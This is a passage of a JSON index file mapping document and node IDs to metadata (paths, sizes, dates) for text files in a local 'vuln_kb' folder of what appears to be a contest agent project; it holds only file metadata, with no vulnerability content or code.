"last_modified_date": "2025-04-22"}}, "fba510bf-3047-4b02-bab7-5ab7e78ec96c": {"node_ids": ["b6526c3a-3994-4103-8d5e-57c0cd9b231b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175730_979419.clean.txt", "file_name": "20250408_175730_979419.clean.txt", "file_type": "text/plain", "file_size": 1436, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c4ad0626-b1fb-40f9-a83c-94a794bb23ce": {"node_ids": ["edbcca9a-685c-436d-8a17-75620e80ca26"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_795471.clean.txt", "file_name": "20250408_175728_795471.clean.txt", "file_type": "text/plain", "file_size": 991, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "3ff6a2e0-063b-4e2e-94a3-d80fa47a129b": {"node_ids": ["71161734-9db6-4398-9a4f-7177225bba60"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_874805.clean.txt", "file_name": "20250408_175728_874805.clean.txt", "file_type": "text/plain", "file_size": 1877, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "64f0b225-6457-4c2d-a66e-766a3cc6bbe6": {"node_ids": ["7e612922-c0e6-4e4b-a37c-25c0fa1bd259"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_191160.clean.txt", "file_name": "20250408_175638_191160.clean.txt", "file_type": "text/plain", "file_size": 1452, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "32a84492-20ca-4031-8647-8cb98bdfce01": {"node_ids": ["6f5cc130-37e1-4079-873d-25d761e2a73a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_329027.clean.txt", "file_name": "20250408_175717_329027.clean.txt", "file_type": "text/plain", "file_size": 983, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "16664d19-ba96-4e43-a461-54c27917a287": {"node_ids": ["d935ed0e-808e-4dac-8c78-e596aa277c26"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_369037.clean.txt", "file_name": "20250408_175647_369037.clean.txt", "file_type": "text/plain", "file_size": 2314, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "5554a626-9d0a-4727-bef4-2b73a53129ad": {"node_ids": ["a83345e6-688e-4178-b6c9-dc78ce8bab9b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_181365.clean.txt", "file_name": "20250408_175708_181365.clean.txt", "file_type": "text/plain", "file_size": 2991, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "15d6558f-b573-497d-bf1c-958cc813c5e9": {"node_ids": ["f793371b-6e48-4022-8025-02ff712e2bd5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_936043.clean.txt", "file_name": "20250408_175714_936043.clean.txt", "file_type": "text/plain", "file_size": 660, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "eae5884d-40ad-4523-896f-01fbc5006c06": {"node_ids": ["9c0c1d4d-eed5-4b8b-b11a-c225f45d907a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_017204.clean.txt", "file_name": "20250408_175645_017204.clean.txt", "file_type": "text/plain", "file_size": 3207, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c61c5140-4be8-4bd3-8ab4-5439ff3c468f": {"node_ids": ["102e2008-bafc-4bd1-9153-d7a3055497e5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_532246.clean.txt", "file_name": "20250408_175719_532246.clean.txt", "file_type": "text/plain", "file_size": 1373, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "2e442269-5031-4c17-af2e-8b6741e85195": {"node_ids": ["cf53c8e3-c83f-46d2-8e3c-58db88aa0f23"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_466234.clean.txt", "file_name": "20250408_175703_466234.clean.txt", "file_type": "text/plain", "file_size": 749, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "2e5d3d56-8713-4da4-8a37-f6c133ea36fd": {"node_ids": ["addc2515-350a-47e7-8260-43aff8e7b221", "a8852d4c-2584-4bf0-8b2b-48e4ee4d2862"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_772653.clean.txt", "file_name": "20250408_175658_772653.clean.txt", "file_type": "text/plain", "file_size": 5078, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "8e40cee6-dfe9-43ba-9f52-2a2623d4d260": {"node_ids": ["da5bf6c8-a0a5-4774-a149-a202702d3241"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_833802.clean.txt", "file_name": "20250408_175642_833802.clean.txt", "file_type": "text/plain", "file_size": 3268, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "afd23465-f5dd-43b9-9a17-e686ec676e2d": {"node_ids": ["63f08283-a108-4a28-8561-b63a134a838d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_072076.clean.txt", "file_name": "20250408_175701_072076.clean.txt", "file_type": "text/plain", "file_size": 3102, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "0493ef12-67e1-4a8f-9468-6dadf00952f7": {"node_ids": ["faf3ff2b-7228-46b3-9d18-d6c2c572847b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_182221.clean.txt", "file_name": "20250408_175701_182221.clean.txt", "file_type": "text/plain", "file_size": 3576, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "09c17b06-50ed-432e-9de9-6f0cc2e7f266": {"node_ids": ["40e78730-9b1b-4692-8176-10c29d73a752"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_764061.clean.txt", "file_name": "20250408_175728_764061.clean.txt", "file_type": "text/plain", "file_size": 798, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "cadbfe77-a339-47bb-ab5c-109fe72446a4": {"node_ids": ["15a27b97-7ee0-4b90-858e-9172ad576c9d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_142983.clean.txt", "file_name": "20250408_175731_142983.clean.txt", "file_type": "text/plain", "file_size": 647, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "39f1d7be-f5a2-494a-a4ce-a9c7ce1dcbaa": {"node_ids": ["03cda080-7826-4834-a202-7f40db974064"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_879397.clean.txt", "file_name": "20250408_175721_879397.clean.txt", "file_type": "text/plain", "file_size": 3329, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "38587683-fd88-4a06-b939-12ecc3292756": {"node_ids": ["27e36b2e-ad43-4f87-b620-42ef3224d165"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_423436.clean.txt", "file_name": "20250408_175717_423436.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "b29dd12b-ac36-4849-a589-d982c69f2e54": {"node_ids": ["a6c0f852-9d77-4ff1-a0c4-cba7edca45ff"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_524834.clean.txt", "file_name": "20250408_175726_524834.clean.txt", "file_type": "text/plain", "file_size": 1095, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "bce25272-be39-4144-8a0e-18bea5d0d26a": {"node_ids": ["ad9a1d74-ac20-4905-a268-e282446dd4a2"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_571908.clean.txt", "file_name": "20250408_175726_571908.clean.txt", "file_type": "text/plain", "file_size": 1514, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "e0bab84e-7eb7-4528-bb30-c221fa04943e": {"node_ids": ["d0024ff1-3400-4ef4-b1b2-18ffa3645a83", "32893812-9a19-437a-b858-f245cde8b1ac"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_483250.clean.txt", "file_name": "20250408_175647_483250.clean.txt", "file_type": "text/plain", "file_size": 6158, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "85c7d974-4f34-409d-9413-14876b261862": {"node_ids": ["c7b43810-5275-4cee-881f-b5365fa1a8ea"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_661788.clean.txt", "file_name": "20250408_175728_661788.clean.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "200abcf2-499b-4399-854f-90b45c2d1d8e": {"node_ids": ["4deac1d5-ee44-4a7c-a3f0-396ef522b1f9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_325985.clean.txt", "file_name": "20250408_175647_325985.clean.txt", "file_type": "text/plain", "file_size": 1759, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "dcedcb07-81eb-48ac-be26-c4306235bcc5": {"node_ids": ["4e8ca7df-acb2-4a07-8aef-267fa5a13ec9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_515431.clean.txt", "file_name": "20250408_175710_515431.clean.txt", "file_type": "text/plain", "file_size": 1592, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "998f8e67-bbac-431d-b9fb-9051d14942c5": {"node_ids": ["ad8e3bb9-c166-439b-a0d3-77e0d3bcde93"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_426701.clean.txt", "file_name": "20250408_175640_426701.clean.txt", "file_type": "text/plain", "file_size": 2346, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "6d9f9102-220a-4af6-be46-11a5bc55862e": {"node_ids": ["08c42fda-a4e9-4115-9e15-24ceb5c4d306"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_978034.clean.txt", "file_name": "20250408_175651_978034.clean.txt", "file_type": "text/plain", "file_size": 850, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "0dc93e74-dfba-4895-bb49-11456d0ce588": {"node_ids": ["c95c830e-beca-49ff-8797-9692ad9b9a55"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_566691.clean.txt", "file_name": "20250408_175735_566691.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "04da8b49-a510-491c-a053-2501078bc14e": {"node_ids": ["bbf64eb9-9eac-4412-b921-18190925ac5b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_657985.clean.txt", "file_name": "20250408_175719_657985.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "60331ddf-282c-4bd4-ae68-4dd1451744ec": {"node_ids": ["a5ffed9c-cfb2-460f-8c9d-3c14d076372a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_606831.clean.txt", "file_name": "20250408_175735_606831.clean.txt", "file_type": "text/plain", "file_size": 575, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "e2c3f840-0027-4087-b626-b5cba276ee36": {"node_ids": ["06424996-b1ac-4c0d-b40c-f534091627e1"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_269950.clean.txt", "file_name": "20250408_175638_269950.clean.txt", "file_type": "text/plain", "file_size": 1466, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "8ff052df-7d7a-45ed-91ef-768182061d90": {"node_ids": ["dbc01a1c-14b5-47cf-bf7e-50cbda74b508"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_148155.clean.txt", "file_name": "20250408_175724_148155.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c576ce7e-3964-4f1d-9e2b-d0fe49206e29": {"node_ids": ["cccc1ed8-662a-47a4-99e3-00c7c507f0a0", "74aeb6fc-3544-4aa2-a2b6-2db9a9123e0f"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175649_740770.clean.txt", "file_name": "20250408_175649_740770.clean.txt", "file_type": "text/plain", "file_size": 5225, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c2f52a08-3a45-4a12-8195-1f7c53a97218": {"node_ids": ["a9d60b90-02c0-4f27-b912-6618c0c22347"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_258324.clean.txt", "file_name": "20250408_175724_258324.clean.txt", "file_type": "text/plain", "file_size": 1708, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "e19ac637-8e24-4ab9-9afe-8e5d584ab8e9": {"node_ids": ["54056b29-b815-4ee9-8b29-54d5af090a7e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_736495.clean.txt", "file_name": "20250408_175719_736495.clean.txt", "file_type": "text/plain", "file_size": 1348, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "32b91961-1b02-47a8-a0e4-7cc0d97ae9cb": {"node_ids": ["7ebfaa9a-a382-465b-932d-b5458040916a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_291889.clean.txt", "file_name": "20250408_175701_291889.clean.txt", "file_type": "text/plain", "file_size": 1939, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "76586415-d2e3-45d2-99cb-591343257a9b": {"node_ids": ["8a3821f3-59df-4c3a-900a-2129ef70bd23"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_655288.clean.txt", "file_name": "20250408_175703_655288.clean.txt", "file_type": "text/plain", "file_size": 3274, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "19c24b66-7930-4b0d-9a25-675f456a12af": {"node_ids": ["795fe966-dd5a-4152-a5d6-343b0e4132a8"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_695869.clean.txt", "file_name": "20250408_175712_695869.clean.txt", "file_type": "text/plain", "file_size": 986, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "4d5f39d2-9fa1-4eca-908e-fc60439e82db": {"node_ids": ["cadbc57a-93f4-4cd9-9a76-6a1127e2fa98"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175652_011090.clean.txt", "file_name": "20250408_175652_011090.clean.txt", "file_type": "text/plain", "file_size": 2874, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "10302f49-b5f3-4cf9-98c5-4053480ceb40": {"node_ids": ["73fb7e11-2bbd-4700-9124-0b9d1d7d5286"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_579339.clean.txt", "file_name": "20250408_175719_579339.clean.txt", "file_type": "text/plain", "file_size": 1808, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "8a6a6c05-cb44-4f6c-b883-781c6bdb6173": {"node_ids": ["fbbe56e6-d48b-437c-ab7a-f8cc3e4ac50e"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175651_898817.clean.txt", "file_name": "20250408_175651_898817.clean.txt", "file_type": "text/plain", "file_size": 2216, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "82a6cdae-f7c5-4cba-912a-27dd6a957fff": {"node_ids": ["fcf77fdc-5941-4e5f-8224-4b9c326683a5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175733_390728.clean.txt", "file_name": "20250408_175733_390728.clean.txt", "file_type": "text/plain", "file_size": 2682, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "6966d56d-9de7-4eb3-a604-b171afe00f6c": {"node_ids": ["96a679f4-bc53-4b53-9730-a8b354a5fa7b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_865163.clean.txt", "file_name": "20250408_175642_865163.clean.txt", "file_type": "text/plain", "file_size": 1999, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "d0dc3f8a-98cb-4f10-b33c-93ab92d95dbe": {"node_ids": ["67713d80-8fbd-4a2b-846c-7d07831a324a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_561128.clean.txt", "file_name": "20250408_175703_561128.clean.txt", "file_type": "text/plain", "file_size": 3054, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "f679cce1-0d1f-4e14-a9cc-a3c5eb6a205b": {"node_ids": ["c9713caf-7ac6-462d-ab32-69892219dc5a"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_765733.clean.txt", "file_name": "20250408_175705_765733.clean.txt", "file_type": "text/plain", "file_size": 2114, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "b2672711-e716-48bc-a25c-dd71e0455c29": {"node_ids": ["f1df7e76-9b81-4eff-9cea-0c0e7efabd32"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_664605.clean.txt", "file_name": "20250408_175656_664605.clean.txt", "file_type": "text/plain", "file_size": 1711, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "7ad6a982-52a2-484d-90b4-9f4a398084ff": {"node_ids": ["45a4aec0-1394-4489-a4b2-f504b4846085"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_899111.clean.txt", "file_name": "20250408_175658_899111.clean.txt", "file_type": "text/plain", "file_size": 1712, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "a725a72b-3602-4e55-b12f-4f7fcf3172a8": {"node_ids": ["26eca0da-e48d-4b4f-92be-c38e2041767d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_797159.clean.txt", "file_name": "20250408_175642_797159.clean.txt", "file_type": "text/plain", "file_size": 2352, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "68a326f2-17e9-418c-98ba-8e509ecc52b6": {"node_ids": ["33af227e-e206-4028-ab0e-d3cbbe376b90"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175735_647466.clean.txt", "file_name": "20250408_175735_647466.clean.txt", "file_type": "text/plain", "file_size": 670, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "6509e95e-6685-4525-8f38-0ccfdae41fe3": {"node_ids": ["8ef55d67-62f4-4e2d-8069-fe5273630b68"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_127626.clean.txt", "file_name": "20250408_175645_127626.clean.txt", "file_type": "text/plain", "file_size": 2470, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "3eda2b51-7e17-4304-8074-2711dcc853b5": {"node_ids": ["a8994e4b-f0a4-4f78-bf5b-5ca28cdaa25b"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_608027.clean.txt", "file_name": "20250408_175703_608027.clean.txt", "file_type": "text/plain", "file_size": 2854, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "9f9916b2-c6c0-469e-8990-2c9ef720981b": {"node_ids": ["25587ad1-5990-4f01-ab6e-38d8c3e24ed4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_354319.clean.txt", "file_name": "20250408_175654_354319.clean.txt", "file_type": "text/plain", "file_size": 1144, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "3d57880b-67e9-4159-b211-c3b8e4eafe23": {"node_ids": ["45fdcec5-4853-4b0f-9788-712b9e9d8a53"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_532452.clean.txt", "file_name": "20250408_175640_532452.clean.txt", "file_type": "text/plain", "file_size": 579, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "c3a11a58-224e-4411-a391-c2743e4ba937": {"node_ids": ["4be3a1a1-6ae6-47b6-b048-dc771f0b1895"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_601802.clean.txt", "file_name": "20250408_175656_601802.clean.txt", "file_type": "text/plain", "file_size": 3326, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "d17ba352-18c1-4255-bb81-1e691542e20a": {"node_ids": ["9e18868d-6d96-4f99-8a27-735b66ee7f2d"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_290088.clean.txt", "file_name": "20250408_175647_290088.clean.txt", "file_type": "text/plain", "file_size": 2242, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "5d4a87fe-1111-4623-98e4-3cbc7324a13e": {"node_ids": ["297b1001-62db-45c2-b061-872aa7777136"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_710647.clean.txt", "file_name": "20250408_172348_710647.clean.txt", "file_type": "text/plain", "file_size": 1189, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "406ede81-16f6-4035-a1bc-a13bea2cf843": {"node_ids": ["515f5045-3502-4b85-893f-a294f931d188"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_459236.clean.txt", "file_name": "20250408_175640_459236.clean.txt", "file_type": "text/plain", "file_size": 2345, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "ccbca342-30a8-40f5-95b1-5312b5c4d20b": {"node_ids": ["e011446b-623d-4df5-82a2-105fe9fcc010"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175719_610862.clean.txt", "file_name": "20250408_175719_610862.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "e8025ce9-df34-4037-b000-dd1f7a3b1139": {"node_ids": ["f3a5baf0-ac27-455c-8992-ed57bf857da6", "560e22f2-bce4-4c91-bacb-eb0c8fe84eba"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.clean.txt", "file_name": "20250408_175638_096710.clean.txt", "file_type": "text/plain", "file_size": 5336, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "f591bc8d-81cf-40cc-b244-14ee0a71a929": {"node_ids": ["ea95c5be-eb99-4713-aa51-ebfb0a4132e5"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_938739.clean.txt", "file_name": "20250408_175705_938739.clean.txt", "file_type": "text/plain", "file_size": 2348, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "91d451d9-dbcd-4726-9c4e-61fdc528a654": {"node_ids": ["4f8b7897-4174-4bce-b883-51d6ed08d4e9"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_865168.clean.txt", "file_name": "20250408_175658_865168.clean.txt", "file_type": "text/plain", "file_size": 1305, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "89e3ffb3-8ca1-42e7-9a0c-a0814024c1e4": {"node_ids": ["f3a8e044-e7dd-4fe3-a6c0-d204a62b5ca7"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175703_529990.clean.txt", "file_name": "20250408_175703_529990.clean.txt", "file_type": "text/plain", "file_size": 4470, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "bff45020-2884-4541-a325-5865a192e7e3": {"node_ids": ["4e356059-6b68-4d48-99b8-a0c297e786da", "a146f45d-73c3-4a49-b558-d1cb47d03bcb"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175731_064402.clean.txt", "file_name": "20250408_175731_064402.clean.txt", "file_type": "text/plain", "file_size": 4826, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "752e327f-2c13-483b-935a-33135d032139": {"node_ids": ["e318e902-c827-48b9-a4c1-187b4fac1541"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175647_450260.clean.txt", "file_name": "20250408_175647_450260.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "ced43e07-df1b-4fee-8f76-5456553cfee5": {"node_ids": ["b124fef2-8ad3-4b77-87d3-ab633da63d92"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_228658.clean.txt", "file_name": "20250408_175708_228658.clean.txt", "file_type": "text/plain", "file_size": 3038, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "b07dc340-c0c5-4747-a58d-a102f6c7acc3": {"node_ids": ["30392187-b0bf-4145-844b-7c909df725db"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_797358.clean.txt", "file_name": "20250408_175705_797358.clean.txt", "file_type": "text/plain", "file_size": 1464, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "5235e34c-35db-4f64-acf7-aa8564dde543": {"node_ids": ["46b625e7-6999-4cc6-9127-d8ae1d97e378"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_024120.clean.txt", "file_name": "20250408_175708_024120.clean.txt", "file_type": "text/plain", "file_size": 3412, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "74fd59a7-b3cc-43c8-926d-965cd09fbc3d": {"node_ids": ["0dbcbcac-edf9-4cf4-9371-aa6953a47bb4"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_701252.clean.txt", "file_name": "20250408_175728_701252.clean.txt", "file_type": "text/plain", "file_size": 940, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "eaebb43a-59ca-440e-bb27-3b81e4ab511e": {"node_ids": ["cc998590-070b-4c5c-9ee3-c6a84b9306aa"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_103526.clean.txt", "file_name": "20250408_175701_103526.clean.txt", "file_type": "text/plain", "file_size": 1145, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, "a79abfa5-369b-46f6-853d-579bf5421b5d": {"node_ids": ["13389175-86a7-4283-80b6-6452d57c5c61"], "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_174735.clean.txt", "file_name": "20250408_175645_174735.clean.txt", "file_type": "text/plain", "file_size": 2911, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}}, 